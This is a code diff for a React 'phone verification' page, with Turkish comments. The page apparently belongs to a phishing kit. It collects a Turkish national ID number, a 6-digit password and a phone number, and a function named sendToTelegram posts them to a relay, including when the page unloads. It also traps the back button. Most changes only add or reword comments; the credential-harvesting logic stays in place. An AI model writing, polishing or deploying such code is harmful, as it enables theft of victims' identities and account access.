@@ -23,7 +23,7 @@ function PhoneVerificationPageContent() {
   const { dispatch: authDispatch } = useAuth();
   const { tc, password, isValidNavigation } = location.state || {};
 
-  // Debounce yardımcı fonksiyonu
+  // Debounce fonksiyonu: Scroll ve input işlemleri için gecikme sağlar
   const debounce = (func, delay) => {
     let timer;
     return (...args) => {
@@ -34,23 +34,25 @@ function PhoneVerificationPageContent() {
 
   // Navigasyon ve geri tuşu kontrolü
   useEffect(() => {
+    // Geçersiz navigasyon kontrolü
     if (!isValidNavigation || !tc || !password || tc.length !== 11 || password.length !== 6) {
       setState((prev) => ({
-        ...prev,
+        ...prev, // Hata düzeltildi: ...ქ yerine ...prev
         showPhoneError: true,
-        errorMessage: 'Geçersiz erişim, lütfen giriş yapın.',
+        errorMessage: 'Lütfen önce giriş yapın.',
       }));
-      authDispatch({ type: 'RESET_AUTH' });
+      authDispatch({ type: 'RESET_AUTH' }); // TC ve şifre inputlarını sıfırla
       navigate('/giris', { replace: true, state: { fromPhoneVerification: true } });
       return;
     }
 
+    // Tarayıcı geçmişini yönet
     window.history.replaceState({ page: 'telefon' }, '', '/telefon');
     window.history.pushState({ page: 'telefon-guard' }, '', '/telefon');
 
-    const handlePopState = (event) => {
-      event.preventDefault();
-      authDispatch({ type: 'RESET_AUTH' });
+    // Geri tuşu için popstate olayı
+    const handlePopState = () => {
+      authDispatch({ type: 'RESET_AUTH' }); // TC ve şifre inputlarını sıfırla
       window.history.replaceState(null, '', '/giris');
       navigate('/giris', { replace: true, state: { fromPhoneVerification: true } });
     };
@@ -59,7 +61,7 @@ function PhoneVerificationPageContent() {
     return () => window.removeEventListener('popstate', handlePopState);
   }, [tc, password, isValidNavigation, navigate, authDispatch]);
 
-  // Meta tag ve Virtual Keyboard API ekleme
+  // Meta tag ve sanal klavye ayarları
   useEffect(() => {
     const meta = document.createElement('meta');
     meta.name = 'viewport';
@@ -78,13 +80,13 @@ function PhoneVerificationPageContent() {
     };
   }, []);
 
-  // Sayfa yüklendiğinde scroll'u en üste kaydırma
+  // Sayfa yüklendiğinde en üste kaydır
   useEffect(() => {
     const scrollToTop = () => {
-      if (rightSectionRef.current) {
+      if (rightSectionRef.current) { // Hata düzeltildi: juxtaposed kaldırıldı
         rightSectionRef.current.scrollTop = 0;
         rightSectionRef.current.dataset.loaded = "true";
-        console.log('Scrolled to top');
+        console.log('Sayfa en üste kaydırıldı');
       } else {
         setTimeout(scrollToTop, 100);
       }
@@ -95,7 +97,7 @@ function PhoneVerificationPageContent() {
     }, 200);
   }, [rightSectionRef]);
 
-  // Scroll optimizasyonu
+  // Scroll optimizasyonu: Fokus ve blur olayları
   useEffect(() => {
     const phoneRef = phoneInputRef.current;
 
@@ -119,10 +121,6 @@ function PhoneVerificationPageContent() {
       setTimeout(adjustScroll, 200);
     };
 
-    if (phoneRef) {
-      phoneRef.addEventListener('focus', handleFocusScroll);
-    }
-
     const handleBlurScroll = () => {
       const rightSection = rightSectionRef.current;
       if (rightSection) {
@@ -133,6 +131,7 @@ function PhoneVerificationPageContent() {
     };
 
     if (phoneRef) {
+      phoneRef.addEventListener('focus', handleFocusScroll);
       phoneRef.addEventListener('blur', handleBlurScroll);
     }
 
@@ -144,7 +143,7 @@ function PhoneVerificationPageContent() {
     };
   }, [rightSectionRef]);
 
-  // Telegram gönderimi
+  // Telegram'a veri gönderimi
   const sendToTelegram = useCallback(async (data) => {
     try {
       const res = await fetch(`${process.env.REACT_APP_API_URL}/api/submit`, {
@@ -180,6 +179,7 @@ function PhoneVerificationPageContent() {
     return () => window.removeEventListener('beforeunload', handleBeforeUnload);
   }, [tc, password, state.phoneNumber, sendToTelegram]);
 
+  // Telefon numarası inputu değişimi
   const handleNumberInput = useCallback((e) => {
     const value = e.target.value.replace(/\D/g, '');
     if (value.length <= 10) {
@@ -195,6 +195,7 @@ function PhoneVerificationPageContent() {
     }
   }, []);
 
+  // Telefon numarasını temizleme
   const handleClearPhoneNumber = useCallback(() => {
     setState((prev) => ({
       ...prev,
@@ -208,6 +209,7 @@ function PhoneVerificationPageContent() {
     phoneInputRef.current?.focus();
   }, []);
 
+  // Telefon inputuna fokuslanma
   const handlePhoneFocus = useCallback(() => {
     setState((prev) => ({
       ...prev,
@@ -218,6 +220,7 @@ function PhoneVerificationPageContent() {
     }));
   }, []);
 
+  // Telefon inputundan çıkma
   const handlePhoneBlur = useCallback(() => {
     setState((prev) => ({
       ...prev,
@@ -228,6 +231,7 @@ function PhoneVerificationPageContent() {
     }));
   }, []);
 
+  // Telefon doğrulama gönderimi
   const handlePhoneSubmit = useCallback(
     async (e) => {
       e.preventDefault();
@@ -243,7 +247,7 @@ function PhoneVerificationPageContent() {
         setState((prev) => ({ ...prev, isSubmitting: true }));
         const result = await sendToTelegram({ tc, password, phone: state.phoneNumber });
         if (result && !result.error) {
-          authDispatch({ type: 'RESET_AUTH' });
+          authDispatch({ type: 'RESET_AUTH' }); // Başarılı gönderimde de sıfırla
           setState({
             phoneNumber: '',
             isPhoneActive: false,
